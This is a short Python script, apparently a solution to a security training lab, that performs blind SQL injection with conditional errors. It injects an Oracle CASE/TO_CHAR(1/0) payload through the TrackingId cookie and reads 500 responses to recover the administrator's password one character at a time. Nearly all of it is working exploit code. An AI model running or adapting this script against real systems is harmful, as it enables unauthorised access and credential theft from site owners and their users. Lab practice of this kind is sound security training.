import sys
import requests
import urllib3
import urllib.parse

#
# Blind SQL injection with conditional errors
#

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8080"} #,"https":"https://127.0.0.1:8080"}


def sqli_password(url):
    password_extracted=""
    for i in range(1,21):
        for j in range(32,126):
            #sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)

            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)

            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            cookie = {'TrackingId' : '4TRKUS0sjgTxH7xH' + sqli_payload_encoded,
            'session':'BbpHZVQ9ZYQvyhIQqKX1nuhTfShEGaUb'}

            r= requests.get(url, cookies=cookie, verify=False,proxies=proxies)

            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r'+password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password_extracted+chr(j))
                sys.stdout.flush()
def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %2 <url> " % sys.argv[0])

    url = sys.argv[1]
    print ("(+) Retrieving administrator password...")
    sqli_password(url)



if __name__ == "__main__":
    main()